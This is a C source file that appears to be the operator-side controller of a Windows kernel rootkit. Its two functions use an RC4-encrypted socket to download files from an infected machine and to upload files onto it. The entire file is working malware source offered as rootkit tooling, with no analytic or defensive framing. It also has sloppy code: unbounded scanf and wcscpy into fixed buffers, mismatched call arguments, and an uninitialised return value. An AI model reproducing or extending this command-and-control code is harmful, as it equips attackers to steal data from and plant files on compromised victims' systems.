#include "server_globals.h"

BOOLEAN rootkit_get_file_from_kernel(IN SOCKET sock, IN BYTE PacketType)
{
	ZEROBANK_PACKET_TYPE type = { 0 };
	INT filesize = 0;
	INT sendsize = 0;
	INT Amount = 0;
	INT Size = 0;
	HANDLE filehandle = NULL;
	WCHAR SaveFileLocation[MAX_PATH] = { 0 };
	WCHAR wzPrefix[MAX_PATH] = { 0 };
	UNICODE_STRING uni = { 0 };
	OBJECT_ATTRIBUTES oa = { 0 };
	IO_STATUS_BLOCK io = { 0 };
	NTSTATUS st;
	LARGE_INTEGER large = { 0 };
	BOOLEAN ret;
	PVOID Buffer = NULL, Out = NULL;

	printf("\r\n{ KERNEL-FILE-TRANSFER-PLUGIN } Introduce file to download (NT-Format)-> ");
	scanf("%s", &type.FileName_For_File_Transfer);

	type.PacketType = PacketType;

	wprintf(L"\r\n{ KERNEL-FILE-TRANSFER-PLUGIN } Enter full path-name for file saving");
	wprintf(L"\r\n{ KERNEL-FILE-TRANSFER-PLUGIN } Example C:\\Users\\Documents\\[name and extension]");
	wprintf(L"\r\n{ KERNEL-FILE-TRANSFER-PLUGIN }-> ");
	wscanf(L"\r\n%ws", SaveFileLocation);
	wcscpy(wzPrefix, L"\\??\\");
	wcscat(wzPrefix, SaveFileLocation);

	sendsize = send_packet_encrypted(sock, RC4_KEY_2, (PZEROBANK_PACKET_TYPE)&type, sizeof(ZEROBANK_PACKET_TYPE));
	if (sendsize > 0)
	{

		// receiving kernel data in chunks of 1024 bytes

		char *filesize = (char*)RtlAllocateHeap(GetProcessHeap(), 
			HEAP_ZERO_MEMORY, 
			1024);
		if (recv(sock, filesize, 1024, 0))
		{
			Size = atoi(filesize);
			printf("\r\n{ KERNEL-FILE-TRANSFER-PLUGIN } File size: %d", Size);
		}

		Out = recv_decrypted(sock, RC4_KEY_3, (PVOID)Buffer, Size);
		if (Out == NULL)
			return FALSE;

		RtlInitUnicodeString(&uni, wzPrefix);
		InitializeObjectAttributes(&oa, &uni, OBJ_CASE_INSENSITIVE, NULL, NULL);
		large.QuadPart = 1024;
		__try
		{
			st = NtCreateFile(&filehandle, 
				FILE_GENERIC_WRITE, 
				&oa, 
				&io, 
				&large, 
				FILE_ATTRIBUTE_NORMAL, 
				FILE_SHARE_WRITE, 
				FILE_CREATE, 
				FILE_NON_DIRECTORY_FILE | FILE_SYNCHRONOUS_IO_NONALERT, 
				NULL, 
				0);
			if (NT_SUCCESS(st))
			{

				printf("\r\n{ KERNEL-FILE-TRANSFER-PLUGIN } File successfully created");

				st = NtWriteFile(filehandle, 
					NULL, 
					NULL, 
					NULL, 
					&io, 
					(PVOID)Out, 
					Size, 
					NULL, 
					0);
				if (NT_SUCCESS(st))
				{
					printf("\r\n{ KERNEL-FILE-TRANSFER-PLUGIN } Data successfully written to file");
					NtClose(filehandle);
					ret = TRUE;
				}
				else
				{
					printf("\r\nNtWriteFile error: 0x%x", st);			
					ret=FALSE;				
				}
			}
			else
			{
				printf("\r\nNtCreateFile error: 0x%x", st);
				ret = FALSE;
			}
		}
		__except (EXCEPTION_EXECUTE_HANDLER)
		{
			RtlFreeHeap(GetProcessHeap(), 0, Buffer);
			printf("\r\nException Catch");
		}

		RtlFreeHeap(GetProcessHeap(), 0, Buffer);
	}

	else
	{
		printf("\r\nError sending packet");
		ret = FALSE;
	}


	return ret;
}

BOOLEAN rootkit_send_file_to_kernel(IN SOCKET sock, IN BYTE PacketType)
{
	NTSTATUS st;
	FILE_STANDARD_INFORMATION fileinfo = { 0 };
	OBJECT_ATTRIBUTES oa = { 0 };
	UNICODE_STRING ustr1 = { 0 };
	IO_STATUS_BLOCK io = { 0 };
	BOOL ret;
	HANDLE handle;
	WCHAR path[MAX_PATH] = { 0 };
	ZEROBANK_PACKET_TYPE Type = { 0 };
	ROOTKIT_STORE_USERSPACE_FILE storefile = { 0 };
	int sendsize = 0;
	PVOID Buffer = NULL;


	wprintf(L"\r\n{ USER-TO-KERNEL-FILE-TRANSFER } Introduce file to send (NT Format) -> ");
	wscanf(L"%ws", path);

	printf("\r\n{ USER-TO-KERNEL-FILE-TRANSFER } Introduce file-storing name-> ");
	scanf("%s", storefile.FileName);

	Type.PacketType = PacketType;

	sendsize = send_packet_encrypted(sock, RC4_KEY_2, (PZEROBANK_PACKET_TYPE)&Type, sizeof(ZEROBANK_PACKET_TYPE), 0);
	if (sendsize <= 0)
		ret = FALSE;

	RtlInitUnicodeString(&ustr1, path);
	InitializeObjectAttributes(&oa, &ustr1, OBJ_CASE_INSENSITIVE, NULL, NULL);
	st = NtCreateFile(&handle, FILE_GENERIC_READ, &oa, &io, 0, FILE_ATTRIBUTE_NORMAL, FILE_SHARE_READ,
		FILE_OPEN, FILE_NON_DIRECTORY_FILE | FILE_SYNCHRONOUS_IO_NONALERT, NULL, 0);
	if (!NT_SUCCESS(st))
	{
		NtClose(handle);
		ret = FALSE;
	}

	st = NtQueryInformationFile(handle, &io, &fileinfo, sizeof(FILE_STANDARD_INFORMATION), FileStandardInformation);
	if (!NT_SUCCESS(st))
		ret = FALSE;

	storefile.FileSize = (unsigned long)fileinfo.EndOfFile.QuadPart;

	printf("\r\n{ USER-TO-KERNEL-FILE-TRANSFER } File Bytes: %lu", storefile.FileSize);

	Buffer = LocalAlloc(LPTR, fileinfo.EndOfFile.QuadPart);
	if (Buffer == NULL)
		ret = FALSE;

	printf("\r\n{ USER-TO-KERNEL-FILE-TRANSFER } Memory Allocated: 0x%p", Buffer);

	st = NtReadFile(handle, NULL, NULL, NULL, &io, (PVOID)Buffer, fileinfo.EndOfFile.QuadPart, NULL, 0);
	if (!NT_SUCCESS(st))
		ret = FALSE;

	sendsize = send(sock, (const char*)&storefile, sizeof(ROOTKIT_STORE_USERSPACE_FILE), 0);
	if (sendsize > 0)
	{
		printf("\r\n{ USER-TO-KERNEL-FILE-TRANSFER } File Size sent");

		sendsize = send(sock, (const char*)Buffer, (ULONG)fileinfo.EndOfFile.QuadPart, 0);
		if (sendsize > 0)
		{
			printf("\r\n{ USER-TO-KERNEL-FILE-TRANSFER } File Buffer sent");
			ret = TRUE;
		}
	}

	NtClose(handle);
	LocalFree(Buffer);

	return ret;
}